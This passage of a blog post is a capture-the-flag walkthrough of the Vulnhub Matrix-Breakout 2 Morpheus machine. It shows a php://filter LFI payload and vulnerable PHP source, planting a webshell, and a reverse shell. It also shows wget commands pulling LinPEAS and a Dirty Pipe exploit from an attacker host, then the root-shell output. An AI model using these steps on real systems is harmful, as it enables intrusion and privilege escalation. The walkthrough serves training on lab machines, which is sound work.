+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png"
+        title="image-20231115143317154" /></p>
+<p>Decode with base64 and then got the source code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="s2">&#34;graffiti.txt&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="o">]</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">       <span class="nv">$file</span><span class="o">=</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;message&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$handle</span> <span class="o">=</span> fopen<span class="o">(</span><span class="nv">$file</span>, <span class="s1">&#39;a+&#39;</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">&#39;Cannot open file: &#39;</span> . <span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        fwrite<span class="o">(</span><span class="nv">$handle</span>, <span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;message&#39;</span><span class="o">])</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	fwrite<span class="o">(</span><span class="nv">$handle</span>, <span class="s2">&#34;\n&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        fclose<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Display file
+</span></span><span class="line"><span class="cl"><span class="nv">$handle</span> <span class="o">=</span> fopen<span class="o">(</span><span class="nv">$file</span>,<span class="s2">&#34;r&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="o">(</span>!feof<span class="o">(</span><span class="nv">$handle</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> fgets<span class="o">(</span><span class="nv">$handle</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;&lt;br&gt;\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">fclose<span class="o">(</span><span class="nv">$handle</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We fill the <code>file</code> parameter with <code>php://filter/read=convert.base64-encode/resource=graffiti.php</code>, and we got the source code of <code>graffiti.php</code>.</p>
+<h3 id="2-upload-the-webshell">2. Upload the webshell</h3>
+<p>In the source code of <code>graffiti.php</code>, we can find that the <code>$file</code> variable with replaced with the POST&rsquo;s parameter <code>file</code>, and then write the <code>message</code> we inputed into the <code>file</code>. So, we can use it write a webshell here:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png"
+        title="image-20231115144010659" /></p>
+<p>And then connect it with AntSword:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png"
+        title="image-20231115144659387" /></p>
+<h3 id="3-get-the-reverse-shell">3. Get the reverse shell</h3>
+<p>And then we user a php reverse shell to get shell:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png"
+        title="image-20231115150726321" /></p>
+<p>And then switch the shell by python:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">www-data@morpheus:/$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">www-data@morpheus:/$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">FLAG.txt  boot	dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
+</span></span><span class="line"><span class="cl">bin	  crew	etc  lib   lib64  lost+found  mnt    proc  run	 srv   tmp  var
+</span></span><span class="line"><span class="cl">www-data@morpheus:/$ cat FLAG.txt
+</span></span><span class="line"><span class="cl">cat FLAG.txt
+</span></span><span class="line"><span class="cl">Flag 1!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You<span class="s1">&#39;ve gotten onto the system.  Now why has Cypher locked everyone out of it?
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Can you find a way to get Cypher&#39;</span>s password? It seems like he gave it to
+</span></span><span class="line"><span class="cl">Agent Smith, so Smith could figure out where to meet him.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Also, pull this image from the webserver on port <span class="m">80</span> to get a flag.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/.cypher-neo.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+<p>Now, we need to get root. We can find two user in home:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@morpheus:/$ ls /home
+</span></span><span class="line"><span class="cl">ls /home
+</span></span><span class="line"><span class="cl">cypher	trinity
+</span></span><span class="line"><span class="cl">www-data@morpheus:/$ find / -user cypher -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -user cypher -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/FLAG.txt
+</span></span><span class="line"><span class="cl">www-data@morpheus:/$ find / -user trinity -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">find / -user trinity -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/home/trinity/.bash_logout
+</span></span><span class="line"><span class="cl">/home/trinity/.bashrc
+</span></span><span class="line"><span class="cl">/home/trinity/.profile
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nothing useful. Let&rsquo;s use LinPEAS:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/LinPEAS.sh
+</span></span><span class="line"><span class="cl">wget http://172.16.86.138:8080/LinPEAS.sh
+</span></span><span class="line"><span class="cl">--2023-11-15 06:35:55--  http://172.16.86.138:8080/LinPEAS.sh
+</span></span><span class="line"><span class="cl">Connecting to 172.16.86.138:8080... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Length: <span class="m">847815</span> <span class="o">(</span>828K<span class="o">)</span> <span class="o">[</span>text/x-sh<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Saving to: ‘LinPEAS.sh’
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">LinPEAS.sh          100%<span class="o">[===================</span>&gt;<span class="o">]</span> 827.94K  --.-KB/s    in 0.04s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2023-11-15 06:35:55 <span class="o">(</span>22.5 MB/s<span class="o">)</span> - ‘LinPEAS.sh’ saved <span class="o">[</span>847815/847815<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@morpheus:/var/www/html$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">LinPEAS.sh    graffiti.txt  php_reverse_shell.php  shell.php
+</span></span><span class="line"><span class="cl">graffiti.php  index.html    robots.txt		   trinity.jpeg
+</span></span><span class="line"><span class="cl">www-data@morpheus:/var/www/html$ ls -la
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">1284</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> www-data www-data   <span class="m">4096</span> Nov <span class="m">15</span> 06:35 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root     root       <span class="m">4096</span> Oct <span class="m">28</span>  <span class="m">2021</span> ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">381359</span> Oct <span class="m">28</span>  <span class="m">2021</span> .cypher-neo.png
+</span></span><span class="line"><span class="cl">-rw-rw-rw- <span class="m">1</span> www-data www-data <span class="m">847815</span> Nov <span class="m">15</span>  <span class="m">2023</span> LinPEAS.sh
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data    <span class="m">778</span> Nov <span class="m">15</span> 05:34 graffiti.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data    <span class="m">181</span> Nov <span class="m">15</span> 05:29 graffiti.txt
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data    <span class="m">348</span> Oct <span class="m">28</span>  <span class="m">2021</span> index.html
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">5495</span> Nov <span class="m">15</span>  <span class="m">2023</span> php_reverse_shell.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data     <span class="m">47</span> Oct <span class="m">28</span>  <span class="m">2021</span> robots.txt
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data     <span class="m">31</span> Nov <span class="m">15</span> 05:41 shell.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data  <span class="m">44297</span> Oct <span class="m">28</span>  <span class="m">2021</span> trinity.jpeg
+</span></span><span class="line"><span class="cl">www-data@morpheus:/var/www/html$ chmod +x LinPEAS.sh
+</span></span><span class="line"><span class="cl">chmod +x LinPEAS.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can find something useful:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png"
+        title="image-20231115155130030" /></p>
+<p>We can use Dirty-Pipe to get root. The <a href="https://github.com/imfiver/CVE-2022-0847" target="_blank" rel="noopener noreffer">exploit</a>. Download it and then execute:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/dirty_pipe.sh
+</span></span><span class="line"><span class="cl">wget http://172.16.86.138:8080/dirty_pipe.sh
+</span></span><span class="line"><span class="cl">--2023-11-15 06:47:08--  http://172.16.86.138:8080/dirty_pipe.sh
+</span></span><span class="line"><span class="cl">Connecting to 172.16.86.138:8080... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Length: <span class="m">4855</span> <span class="o">(</span>4.7K<span class="o">)</span> <span class="o">[</span>text/x-sh<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Saving to: ‘dirty_pipe.sh’
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dirty_pipe.sh       100%<span class="o">[===================</span>&gt;<span class="o">]</span>   4.74K  --.-KB/s    in 0s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2023-11-15 06:47:08 <span class="o">(</span><span class="m">489</span> MB/s<span class="o">)</span> - ‘dirty_pipe.sh’ saved <span class="o">[</span>4855/4855<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@morpheus:/var/www/html$ ls -la
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">1292</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> www-data www-data   <span class="m">4096</span> Nov <span class="m">15</span> 06:47 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root     root       <span class="m">4096</span> Oct <span class="m">28</span>  <span class="m">2021</span> ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data <span class="m">381359</span> Oct <span class="m">28</span>  <span class="m">2021</span> .cypher-neo.png
+</span></span><span class="line"><span class="cl">-rwxrwxrwx <span class="m">1</span> www-data www-data <span class="m">847815</span> Nov <span class="m">15</span>  <span class="m">2023</span> LinPEAS.sh
+</span></span><span class="line"><span class="cl">-rw-rw-rw- <span class="m">1</span> www-data www-data   <span class="m">4855</span> Nov <span class="m">15</span> 03:32 dirty_pipe.sh
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data    <span class="m">778</span> Nov <span class="m">15</span> 05:34 graffiti.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data    <span class="m">181</span> Nov <span class="m">15</span> 05:29 graffiti.txt
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data    <span class="m">348</span> Oct <span class="m">28</span>  <span class="m">2021</span> index.html
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data   <span class="m">5495</span> Nov <span class="m">15</span>  <span class="m">2023</span> php_reverse_shell.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data     <span class="m">47</span> Oct <span class="m">28</span>  <span class="m">2021</span> robots.txt
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data     <span class="m">31</span> Nov <span class="m">15</span> 05:41 shell.php
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> www-data www-data  <span class="m">44297</span> Oct <span class="m">28</span>  <span class="m">2021</span> trinity.jpeg
+</span></span><span class="line"><span class="cl">www-data@morpheus:/var/www/html$ chmod +x dirty_pipe.sh
+</span></span><span class="line"><span class="cl">chmod +x dirty_pipe.sh
+</span></span><span class="line"><span class="cl">www-data@morpheus:/var/www/html$ ./dirty_pipe.sh
+</span></span><span class="line"><span class="cl">./dirty_pipe.sh
+</span></span><span class="line"><span class="cl">/etc/passwd已备份到/tmp/passwd
+</span></span><span class="line"><span class="cl">It worked!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 恢复原来的密码</span>
+</span></span><span class="line"><span class="cl">rm -rf /etc/passwd
+</span></span><span class="line"><span class="cl">mv /tmp/passwd /etc/passwd
+</span></span><span class="line"><span class="cl">root@morpheus:/var/www/html# id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@morpheus:/var/www/html# ls /root
+</span></span><span class="line"><span class="cl">ls /root
+</span></span><span class="line"><span class="cl">FLAG.txt
+</span></span><span class="line"><span class="cl">root@morpheus:/var/www/html# cat /root/FLAG.txt
+</span></span><span class="line"><span class="cl">cat /root/FLAG.txt
+</span></span><span class="line"><span class="cl">You<span class="s1">&#39;ve won!
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Let&#39;</span>s hope Matrix: Resurrections rocks!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="attack-path">Attack Path</h2>
+<p>scann web directory &ndash;&gt; analysis php file &ndash;&gt; LFI &ndash;&gt; upload webshell &ndash;&gt; get revers shell &ndash;&gt; privilege escalation</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-11-12</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" data-title="Vulnhub Matrix-breakout-2-Morpheus" data-via="@YaoyaoShaw" data-hashtags="Vulnhub"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" data-hashtag="Vulnhub"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" data-title="Vulnhub Matrix-breakout-2-Morpheus"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" data-title="Vulnhub Matrix-breakout-2-Morpheus"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" data-title="Vulnhub Matrix-breakout-2-Morpheus"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/vulnhub/">Vulnhub</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2023/11/vulnhub_empire_breakout/" class="prev" rel="prev" title="Vulnhub Empire Breakout"><i class="fas fa-angle-left fa-fw"></i>Vulnhub Empire Breakout</a>
+            <a href="/2024/01/cobalt_strike_basic_no.1/" class="next" rel="next" title="Cobalt Strike Basic No.1">Cobalt Strike Basic No.1<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_wit